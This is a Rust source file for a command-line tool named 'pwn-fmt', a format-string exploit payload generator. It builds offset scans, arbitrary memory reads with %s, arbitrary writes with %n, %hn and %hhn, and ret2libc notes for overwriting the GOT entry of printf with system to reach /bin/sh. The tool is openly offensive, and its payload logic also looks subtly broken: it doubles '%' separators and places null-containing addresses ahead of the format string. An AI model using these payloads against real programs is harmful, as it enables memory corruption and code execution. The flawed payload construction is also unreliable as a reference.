//! fmt - 格式串payload生成器
//! 纯计算, 无外部依赖

use clap::{ArgGroup, Parser};
use common::{exit, finish, Mode, Out};
use serde::Serialize;
use std::io::Write;
use std::process::ExitCode;

#[derive(Parser, Debug)]
#[command(
    name = "fmt",
    version,
    about = "格式串payload生成器",
    long_about = "pwn-fmt: 格式串payload生成器\n用法:\n    pwn-fmt --scan <len> <start_idx>           # 扫描偏移(%p)\n    pwn-fmt --write <addr> <val> <start_idx>   # 写任意值(%n)\n    pwn-fmt --write-short <addr> <val> <start_idx>  # 用%hn写(%hn)\n    pwn-fmt --leak <addr> <start_idx>          # 读内存(%s)\n    pwn-fmt --write-byte <addr> <val> <start_idx>   # 写单字节(%hhn)\n    pwn-fmt --libc <system_off> <binsh_off> <start_idx>  # ret2libc payload",
    after_help = "退出码: 0=成功 1=无结果 2=用法错误 3=运行错误",
    group(
        ArgGroup::new("cmd")
            .multiple(false)
            .args(["scan", "write", "write_short", "leak", "write_byte", "libc"])
    )
)]
struct Args {
    /// 扫描偏移: --scan [len] [start_idx]
    #[arg(long, value_names = ["LEN", "START"], num_args = 0..=2)]
    scan: Option<Vec<String>>,

    /// 写任意值(%hhn): --write <addr_hex> <val_hex> <start_idx>
    #[arg(long, value_names = ["ADDR", "VAL", "START"], num_args = 3)]
    write: Option<Vec<String>>,

    /// 用%hn写: --write-short <addr_hex> <val_hex> <start_idx>
    #[arg(long = "write-short", value_names = ["ADDR", "VAL", "START"], num_args = 3)]
    write_short: Option<Vec<String>>,

    /// 读内存(%s): --leak <addr_hex> [start_idx]
    #[arg(long, value_names = ["ADDR", "START"], num_args = 1..=2)]
    leak: Option<Vec<String>>,

    /// 写单字节(%hhn): --write-byte <addr_hex> <val_hex> [start_idx]
    #[arg(long = "write-byte", value_names = ["ADDR", "VAL", "START"], num_args = 2..=3)]
    write_byte: Option<Vec<String>>,

    /// ret2libc payload: --libc <system_off_hex> <binsh_off_hex> [start_idx]
    #[arg(long, value_names = ["SYSTEM_OFF", "BINSH_OFF", "START"], num_args = 2..=3)]
    libc: Option<Vec<String>>,

    /// JSON 输出
    #[arg(long)]
    json: bool,
}

#[derive(Serialize)]
struct Report {
    mode: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    length: Option<usize>,
    #[serde(skip_serializing_if = "Option::is_none")]
    start: Option<usize>,
    #[serde(skip_serializing_if = "Option::is_none")]
    addr: Option<u64>,
    #[serde(skip_serializing_if = "Option::is_none")]
    value: Option<u64>,
    #[serde(skip_serializing_if = "Option::is_none")]
    system_off: Option<u64>,
    #[serde(skip_serializing_if = "Option::is_none")]
    binsh_off: Option<u64>,
    #[serde(skip_serializing_if = "Option::is_none")]
    notes: Option<Vec<String>>,
    payload_hex: String,
    payload_len: usize,
    #[serde(skip_serializing_if = "Option::is_none")]
    format_string: Option<String>,
}

fn to_hex(data: &[u8]) -> String {
    data.iter().map(|b| format!("{b:02x}")).collect()
}

fn write_payload(data: &[u8]) {
    let stdout = std::io::stdout();
    let mut h = stdout.lock();
    let _ = h.write_all(data);
    let _ = h.write_all(b"\n");
    let _ = h.flush();
}

fn parse_hex_arg(s: &str) -> Result<u64, String> {
    common::parse_hex(s)
}

fn parse_dec_arg(s: &str) -> Result<usize, String> {
    s.trim()
        .parse::<usize>()
        .map_err(|e| format!("invalid number '{s}': {e}"))
}

fn scan_payload(length: usize, start: usize) -> (Vec<u8>, String) {
    let parts: Vec<String> = (start..start + length)
        .map(|i| format!(".%{i}$p"))
        .collect();
    let fmt = parts.join("");
    (fmt.clone().into_bytes(), fmt)
}

fn write_qword_byte(addr: u64, value: u64, start: usize) -> (Vec<u8>, String) {
    let mut addrs: Vec<u8> = Vec::new();
    let mut fmt_parts: Vec<String> = Vec::new();
    let mut prev: u64 = 0;

    for i in 0..8u32 {
        let byte_val = (value >> (i * 8)) & 0xFF;
        addrs.extend_from_slice(&(addr + i as u64).to_le_bytes());
        let diff = byte_val.wrapping_sub(prev) % 256;
        let idx = start + i as usize;
        if diff > 0 {
            fmt_parts.push(format!("%{diff}c%{idx}$hhn"));
        } else {
            fmt_parts.push(format!("%{idx}$hhn"));
        }
        prev = byte_val;
    }

    let fmt = fmt_parts.join("%");
    let mut payload = addrs;
    payload.extend_from_slice(fmt.as_bytes());
    (payload, fmt)
}

fn write_qword(addr: u64, value: u64, start: usize) -> (Vec<u8>, String) {
    let mut addrs: Vec<u8> = Vec::new();
    let mut fmt_parts: Vec<String> = Vec::new();
    let mut prev: u64 = 0;

    let mut shorts: Vec<(u16, u64)> = (0..4u32)
        .map(|i| (((value >> (i * 16)) & 0xFFFF) as u16, addr + i as u64 * 2))
        .collect();
    shorts.sort();

    for (idx, (val, a)) in (start..).zip(shorts) {
        addrs.extend_from_slice(&a.to_le_bytes());
        let diff = (val as u64).wrapping_sub(prev) % 0x10000;
        if diff > 0 {
            fmt_parts.push(format!("%{diff}c%{idx}$hn"));
        } else {
            fmt_parts.push(format!("%{idx}$hn"));
        }
        prev = val as u64;
    }

    let fmt = fmt_parts.join("%");
    let mut payload = addrs;
    payload.extend_from_slice(fmt.as_bytes());
    (payload, fmt)
}

fn leak_payload(addr: u64, start: usize) -> (Vec<u8>, String) {
    let fmt = format!("%{start}$s");
    let mut payload = addr.to_le_bytes().to_vec();
    payload.extend_from_slice(fmt.as_bytes());
    (payload, fmt)
}

fn write_byte(addr: u64, byte_val: u64, start: usize) -> (Vec<u8>, String) {
    let fmt = format!("%{byte_val}c%{start}$hhn");
    let mut payload = addr.to_le_bytes().to_vec();
    payload.extend_from_slice(fmt.as_bytes());
    (payload, fmt)
}

fn main() -> ExitCode {
    common::reset_sigpipe();
    let args = Args::parse();
    let out = Out::new(Mode::from_flag(args.json));

    if let Some(vals) = &args.scan {
        let length = match vals.first() {
            Some(s) => match parse_dec_arg(s) {
                Ok(v) => v,
                Err(e) => {
                    out.error(&e);
                    return finish(exit::USAGE);
                }
            },
            None => 20,
        };
        let start = match vals.get(1) {
            Some(s) => match parse_dec_arg(s) {
                Ok(v) => v,
                Err(e) => {
                    out.error(&e);
                    return finish(exit::USAGE);
                }
            },
            None => 6,
        };
        let (payload, fmt) = scan_payload(length, start);
        let report = Report {
            mode: "scan".into(),
            length: Some(length),
            start: Some(start),
            addr: None,
            value: None,
            system_off: None,
            binsh_off: None,
            notes: None,
            payload_hex: to_hex(&payload),
            payload_len: payload.len(),
            format_string: Some(fmt.clone()),
        };
        out.emit(
            || {
                println!("[*] Scan {length} args from ${start}");
                println!("[*] Payload ({} bytes):", payload.len());
                write_payload(&payload);
                println!("[*] Preview: {fmt}");
            },
            &report,
        );
        return finish(exit::OK);
    }

    if let Some(vals) = &args.write {
        let addr = match parse_hex_arg(&vals[0]) {
            Ok(v) => v,
            Err(e) => {
                out.error(&e);
                return finish(exit::USAGE);
            }
        };
        let value = match parse_hex_arg(&vals[1]) {
            Ok(v) => v,
            Err(e) => {
                out.error(&e);
                return finish(exit::USAGE);
            }
        };
        let start = match parse_dec_arg(&vals[2]) {
            Ok(v) => v,
            Err(e) => {
                out.error(&e);
                return finish(exit::USAGE);
            }
        };
        let (payload, fmt) = write_qword_byte(addr, value, start);
        let report = Report {
            mode: "write".into(),
            length: None,
            start: Some(start),
            addr: Some(addr),
            value: Some(value),
            system_off: None,
            binsh_off: None,
            notes: None,
            payload_hex: to_hex(&payload),
            payload_len: payload.len(),
            format_string: Some(fmt),
        };
        out.emit(
            || {
                println!("[*] Write 0x{value:x} -> 0x{addr:x}");
                println!("[*] Payload ({} bytes):", payload.len());
                write_payload(&payload);
            },
            &report,
        );
        return finish(exit::OK);
    }

    if let Some(vals) = &args.write_short {
        let addr = match parse_hex_arg(&vals[0]) {
            Ok(v) => v,
            Err(e) => {
                out.error(&e);
                return finish(exit::USAGE);
            }
        };
        let value = match parse_hex_arg(&vals[1]) {
            Ok(v) => v,
            Err(e) => {
                out.error(&e);
                return finish(exit::USAGE);
            }
        };
        let start = match parse_dec_arg(&vals[2]) {
            Ok(v) => v,
            Err(e) => {
                out.error(&e);
                return finish(exit::USAGE);
            }
        };
        let (payload, fmt) = write_qword(addr, value, start);
        let report = Report {
            mode: "write-short".into(),
            length: None,
            start: Some(start),
            addr: Some(addr),
            value: Some(value),
            system_off: None,
            binsh_off: None,
            notes: None,
            payload_hex: to_hex(&payload),
            payload_len: payload.len(),
            format_string: Some(fmt),
        };
        out.emit(
            || {
                println!("[*] Write 0x{value:x} -> 0x{addr:x} (using %hn)");
                println!("[*] Payload ({} bytes):", payload.len());
                write_payload(&payload);
            },
            &report,
        );
        return finish(exit::OK);
    }

    if let Some(vals) = &args.leak {
        let addr = match parse_hex_arg(&vals[0]) {
            Ok(v) => v,
            Err(e) => {
                out.error(&e);
                return finish(exit::USAGE);
            }
        };
        let start = match vals.get(1) {
            Some(s) => match parse_dec_arg(s) {
                Ok(v) => v,
                Err(e) => {
                    out.error(&e);
                    return finish(exit::USAGE);
                }
            },
            None => 6,
        };
        let (payload, fmt) = leak_payload(addr, start);
        let report = Report {
            mode: "leak".into(),
            length: None,
            start: Some(start),
            addr: Some(addr),
            value: None,
            system_off: None,
            binsh_off: None,
            notes: None,
            payload_hex: to_hex(&payload),
            payload_len: payload.len(),
            format_string: Some(fmt),
        };
        out.emit(
            || {
                println!("[*] Leak memory at 0x{addr:x}");
                println!("[*] Payload ({} bytes):", payload.len());
                write_payload(&payload);
            },
            &report,
        );
        return finish(exit::OK);
    }

    if let Some(vals) = &args.write_byte {
        let addr = match parse_hex_arg(&vals[0]) {
            Ok(v) => v,
            Err(e) => {
                out.error(&e);
                return finish(exit::USAGE);
            }
        };
        let value = match parse_hex_arg(&vals[1]) {
            Ok(v) => v,
            Err(e) => {
                out.error(&e);
                return finish(exit::USAGE);
            }
        };
        let start = match vals.get(2) {
            Some(s) => match parse_dec_arg(s) {
                Ok(v) => v,
                Err(e) => {
                    out.error(&e);
                    return finish(exit::USAGE);
                }
            },
            None => 6,
        };
        let (payload, fmt) = write_byte(addr, value, start);
        let report = Report {
            mode: "write-byte".into(),
            length: None,
            start: Some(start),
            addr: Some(addr),
            value: Some(value),
            system_off: None,
            binsh_off: None,
            notes: None,
            payload_hex: to_hex(&payload),
            payload_len: payload.len(),
            format_string: Some(fmt),
        };
        out.emit(
            || {
                println!("[*] Write byte 0x{value:x} -> 0x{addr:x}");
                println!("[*] Payload ({} bytes):", payload.len());
                write_payload(&payload);
            },
            &report,
        );
        return finish(exit::OK);
    }

    if let Some(vals) = &args.libc {
        let system_off = match parse_hex_arg(&vals[0]) {
            Ok(v) => v,
            Err(e) => {
                out.error(&e);
                return finish(exit::USAGE);
            }
        };
        let binsh_off = match parse_hex_arg(&vals[1]) {
            Ok(v) => v,
            Err(e) => {
                out.error(&e);
                return finish(exit::USAGE);
            }
        };
        let start = match vals.get(2) {
            Some(s) => match parse_dec_arg(s) {
                Ok(v) => v,
                Err(e) => {
                    out.error(&e);
                    return finish(exit::USAGE);
                }
            },
            None => 6,
        };
        let notes = vec![
            "需要知道 libc base 地址".to_string(),
            format!("system offset: 0x{system_off:x}"),
            format!("/bin/sh offset: 0x{binsh_off:x}"),
            "payload: [padding] + [pop rdi; ret] + [/bin/sh addr] + [system addr]".to_string(),
            "格式串写入: 覆写 GOT printf -> system".to_string(),
        ];
        let report = Report {
            mode: "libc".into(),
            length: None,
            start: Some(start),
            addr: None,
            value: None,
            system_off: Some(system_off),
            binsh_off: Some(binsh_off),
            notes: Some(notes),
            payload_hex: String::new(),
            payload_len: 0,
            format_string: None,
        };
        out.emit(
            || {
                println!("[*] 需要知道 libc base 地址");
                println!("[*] system offset: 0x{system_off:x}");
                println!("[*] /bin/sh offset: 0x{binsh_off:x}");
                println!(
                    "[*] payload: [padding] + [pop rdi; ret] + [/bin/sh addr] + [system addr]"
                );
                println!("[*] 格式串写入: 覆写 GOT printf -> system");
            },
            &report,
        );
        return finish(exit::OK);
    }

    out.info(
        "pwn-fmt: 格式串payload生成器\n用法:\n    pwn-fmt --scan <len> <start_idx>           # 扫描偏移(%p)\n    pwn-fmt --write <addr> <val> <start_idx>   # 写任意值(%n)\n    pwn-fmt --write-short <addr> <val> <start_idx>  # 用%hn写(%hn)\n    pwn-fmt --leak <addr> <start_idx>          # 读内存(%s)\n    pwn-fmt --write-byte <addr> <val> <start_idx>   # 写单字节(%hhn)\n    pwn-fmt --libc <system_off> <binsh_off> <start_idx>  # ret2libc payload",
    );
    finish(exit::USAGE)
}
